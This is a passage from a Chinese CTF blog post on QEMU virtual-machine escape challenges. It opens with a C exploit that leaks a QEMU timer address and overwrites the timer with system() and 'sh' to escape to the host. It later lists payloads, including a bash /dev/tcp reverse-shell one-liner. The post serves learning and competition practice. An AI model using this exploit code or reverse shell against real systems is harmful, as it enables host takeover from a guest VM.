class="keyword">uint64_t</span> cmb_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint64_t</span>*)(cmb_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> value)</span></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(mmio_mem+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> mmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_write(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span><br><span class="line">&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Err</span><span class="params">(<span class="keyword">char</span>* err)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_mmio</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        Err(<span class="string">"Open pci"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        Err(<span class="string">"mmap mmio_mem"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_cmb</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fdcmb = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource1"</span>, O_RDWR|O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fdcmb &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        Err(<span class="string">"fdcmb open"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cmb_mem = mmap(<span class="literal">NULL</span>, <span class="number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fdcmb, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (cmb_mem == MAP_FAILED) &#123;</span><br><span class="line">        Err(<span class="string">"cmb"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_offset</span><span class="params">(<span class="keyword">uint64_t</span> val)</span></span>&#123;</span><br><span class="line">    outb(val, <span class="number">0x240</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_mode</span><span class="params">(<span class="keyword">uint64_t</span> val)</span></span>&#123;</span><br><span class="line">    outb(val, <span class="number">0x230</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_cmd</span><span class="params">(<span class="keyword">uint64_t</span> val)</span></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x98</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    init_mmio();</span><br><span class="line">    init_cmb();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint32_t</span> res = ioperm(<span class="number">0x230</span>, <span class="number">0x30</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        Err(<span class="string">"ioperm"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//set memorymode and offset</span></span><br><span class="line">    set_mode(<span class="number">1</span>);</span><br><span class="line">    set_offset(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//read vmx_timer</span></span><br><span class="line">    <span class="keyword">uint64_t</span> timer_addr = cmb_read(<span class="number">0x10</span> + <span class="number">0x28</span> + <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking timer_addr: 0x%lx\n"</span>,timer_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> rebase = timer_addr - <span class="number">0x4DCF10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking rebase: 0x%lx\n"</span>,rebase);</span><br><span class="line">    <span class="keyword">uint64_t</span> system_plt_addr = rebase + <span class="number">0x02AB860</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking system_plt_addr: 0x%lx\n"</span>,system_plt_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> sh_str = rebase + <span class="number">0x82871C</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking sh_str: 0x%lx\n"</span>,sh_str);</span><br><span class="line">    cmb_write(<span class="number">0x10</span> + <span class="number">0x28</span> + <span class="number">0x10</span>,system_plt_addr);</span><br><span class="line">    cmb_write(<span class="number">0x10</span> + <span class="number">0x28</span> + <span class="number">0x18</span>,sh_str);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//trick </span></span><br><span class="line">    dma_set_cmd(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="seccon-2018-q-escape"><a href="#seccon-2018-q-escape" class="headerlink" title="seccon-2018-q-escape"></a><strong>seccon-2018-q-escape</strong></h2><p><a href="https://github.com/ray-cp/vm-escape/tree/master/qemu-escape/seccon-2018-q-escape" target="_blank" rel="noopener">vm-escape/qemu-escape/seccon-2018-q-escape at master · ray-cp/vm-escape (github.com)</a></p>
<p><a href="https://ray-cp.github.io/archivers/qemu-pwn-seccon-2018-q-escape" target="_blank" rel="noopener">qemu-pwn-seccon-2018-q-escape « 平凡路上 (ray-cp.github.io)</a></p>
<p>这题就算了，感觉需要对vga设备理解的更深入点，才能更好的分析</p>
<h2 id="关于Qemu逃逸system的问题"><a href="#关于Qemu逃逸system的问题" class="headerlink" title="关于Qemu逃逸system的问题"></a>关于Qemu逃逸system的问题</h2><blockquote>
<ul>
<li>cat /flag</li>
<li>反弹 shell，/bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1’，在 QEMU 逃逸中，执行 system(“/bin/bash”) 是无法拿到 shell 的，或者说是无法与 shell 内容交互的，必须使用反弹 shell 的形式才能够拿到 shell。</li>
<li>弹出计算器，gnome-calculator，这个大概比较适合用于做演示视频吧。</li>
</ul>
</blockquote>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>结合前面做的qemupwn，也做了很多qemu逃逸题了，其实可以发现，常规逃逸题绕来绕去，也就是databuf溢出，配个可以泄露地址的QemuTimer之类的，复杂点就套个timer或者bhThread，来模拟DMA。</p>
<p>也有复杂点的题，像q-escape这种，结合具体设备比较紧密的，另外整个qemu如果抛开这种套路题来说，对设备模拟相关知识要求挺高的，像前面ioperm，非常规IOPort读写这种知识我是完全不知道的，还有很多需要提高啊</p>
<h2 id="Refs"><a href="#Refs" class="headerlink" title="Refs"></a>Refs</h2><p><a href="https://xiaoxiaorenwu.github.io/2020/12/24/XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析/" target="_blank" rel="noopener">XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析 | xiaoxiaorenwu</a></p>
<p><a href="https://a1ex.online/2021/09/17/qemu逃逸学习/" target="_blank" rel="noopener">(<em>´∇｀</em>) 被你发现啦~ qemu逃逸学习 | A1ex’s Blog</a></p>
<p><a href="https://a1ex.online/2021/10/13/从qemu逃逸到逃跑/" target="_blank" rel="noopener">(<em>´∇｀</em>) 被你发现啦~ 从qemu逃逸到逃跑 | A1ex’s Blog</a></p>
<p><a href="https://www.anquanke.com/post/id/256977#h2-0" target="_blank" rel="noopener">从qemu逃逸到逃跑 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p><a href="https://www.anquanke.com/post/id/254906#h3-9" target="_blank" rel="noopener">QEMU逃逸初探（一） - 安全客，安全资讯平台 (anquanke.com)</a></p>

      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2022/04/20/QemuTimer/" rel="next" title="Qemu基础 - Timer和事件循环">
                <i class="fa fa-chevron-left"></i> Qemu基础 - Timer和事件循环
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2022/06/08/AndroidCapture/" rel="prev" title="Android抓包及爬虫研究 - 1">
                Android抓包及爬虫研究 - 1 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  
    <div class="comments" id="comments">
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/head.jpg" alt="zzrR0">
            
              <p class="site-author-name" itemprop="name">zzrR0</p>
              <p class="site-description motion-element" itemprop="description">Why am i so cai.</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">22</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">6</span>
                    <span class="site-state-item-name">分类</span>
                  </a>
                </div>
              

              
            </nav>
          

          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://xmzyshypnc.github.io/" title="xmzyshypnc" target="_blank">xmzyshypnc</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://wood1314.github.io/" title="Wood" target="_blank">Wood</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.zeddyu.info/" title="Zedd" target="_blank">Zedd</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://kestudy.top/" title="Ke" target="_blank">Ke</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#QemuPwn前进四"><span class="nav-number">1.</span> <span class="nav-text">QemuPwn前进四</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#D3CTF"><span class="nav-number">1.1.</span> <span class="nav-text">D3CTF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序分析"><span class="nav-number">1.1.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用流程"><span class="nav-number">1.1.2.</span> <span class="nav-text">利用流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.1.3.</span> <span class="nav-text">exp</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp调试"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">exp调试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2020华为云-qemuzzz"><span class="nav-number">1.2.</span> <span class="nav-text">2020华为云 qemuzzz</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序分析-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.2.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2021-HWS-FastCP"><span class="nav-number">1.3.</span> <span class="nav-text">2021 HWS FastCP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序分析-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-number">1.3.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XNUCA2019-vxee"><span class="nav-number">1.4.</span> <span class="nav-text">XNUCA2019 - vxee</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序分析-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-2"><span class="nav-number">1.4.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#seccon-2018-q-escape"><span class="nav-number">1.5.</span> <span class="nav-text">seccon-2018-q-escape</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于Qemu逃逸system的问题"><span class="nav-number">1.6.</span> <span class="nav-text">关于Qemu逃逸system的问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.7.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Refs"><span class="nav-number">1.8.</span> <span class="nav-text">Refs</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">zzrR0</span>

  

  
</div>




  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>






        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv" title="总访客量">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  

  
    <span class="site-pv" title="总访问量">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>









        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>














  













  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  

  
    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
  

  
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'http://yoursite.com/2022/05/04/QemuPwn前进四/';
        this.page.identifier = '2022/05/04/QemuPwn前进四/';
        this.page.title = 'QemuPwn前进四';
        };
      function loadComments () {
        var d = document, s = d.createElement('script');
        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      }
      
        loadComments();
      
    </script>
  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  
  
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(function (item) {
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: true,
        notify: true,
        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
        placeholder: '',
        avatar:'mm',
        meta:guest,
        pageSize:'10' || 10,
        visitor: true
    });
  </script>



  





  

  

  

  

  
  

  

  

  

  

  

  
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"live2d-widget-model-hijiki"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
</html>
